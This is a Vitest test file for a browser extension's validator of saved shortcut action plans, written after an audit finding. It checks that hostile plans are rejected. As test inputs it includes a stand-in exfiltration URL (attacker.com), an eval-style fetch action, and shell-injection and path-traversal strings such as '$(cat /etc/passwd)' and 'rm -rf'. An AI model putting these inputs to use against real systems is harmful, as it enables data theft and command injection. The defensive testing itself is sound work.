/**
 * Save-time and replay-time validation of shortcut action plans
 * (C-03 audit 2026-05-19).
 *
 * Attack: an allowlisted origin saves a shortcut whose actions[] contains
 * an unknown `type` ('exfil', 'rm', etc.). Today's content-script switch
 * has a default-case that returns "Unsupported action" per-action — but
 * the rest of the plan still runs. We now reject the plan wholesale at
 * save time, and re-validate at replay/execute time so pre-validator
 * shortcuts (older installs) also get rejected.
 */

import { describe, expect, it } from 'vitest';
import { validateShortcutActions } from '../src/background/policy';

describe('C-03 shortcut action validation', () => {
  it('a typical recorded workflow passes validation', () => {
    expect(
      validateShortcutActions([
        { id: '1', type: 'click', selector: '#submit' },
        { id: '2', type: 'wait_for_selector', selector: '#confirm', delay: 1000 },
        { id: '3', type: 'type', selector: 'input[name=email]', value: 'a@b.com' },
      ] as never),
    ).toBe(true);
  });

  it('the autofill flow passes validation', () => {
    expect(
      validateShortcutActions([
        { id: '1', type: 'auto_fill_job_application' },
        { id: '2', type: 'wait_for_selector', selector: '#submit' },
      ] as never),
    ).toBe(true);
  });

  it('rejects a plan with an exfil-like action', () => {
    expect(
      validateShortcutActions([
        { id: '1', type: 'click', selector: '#x' },
        { id: '2', type: 'http_post', value: 'https://attacker.com/?leak=...' },
      ] as never),
    ).toBe(false);
  });

  it('rejects a plan with an eval-like action', () => {
    expect(validateShortcutActions([{ id: '1', type: 'eval', value: 'fetch(...)' }] as never)).toBe(
      false,
    );
  });

  it('rejects shell-injection-shaped action types', () => {
    for (const t of ['rm -rf', '`whoami`', '$(cat /etc/passwd)', '..\\..\\']) {
      expect(validateShortcutActions([{ id: 'x', type: t }] as never)).toBe(false);
    }
  });

  it('rejects an action that is missing the type field entirely', () => {
    expect(validateShortcutActions([{ id: 'x' }] as never)).toBe(false);
  });

  it('rejects an action where type is not a string', () => {
    expect(validateShortcutActions([{ id: 'x', type: 42 }] as never)).toBe(false);
    expect(validateShortcutActions([{ id: 'x', type: null }] as never)).toBe(false);
    expect(validateShortcutActions([{ id: 'x', type: { evil: true } }] as never)).toBe(false);
  });

  it('rejects null and undefined inputs without throwing', () => {
    expect(() => validateShortcutActions(null as never)).not.toThrow();
    expect(() => validateShortcutActions(undefined as never)).not.toThrow();
    expect(validateShortcutActions(null as never)).toBe(false);
    expect(validateShortcutActions(undefined as never)).toBe(false);
  });
});
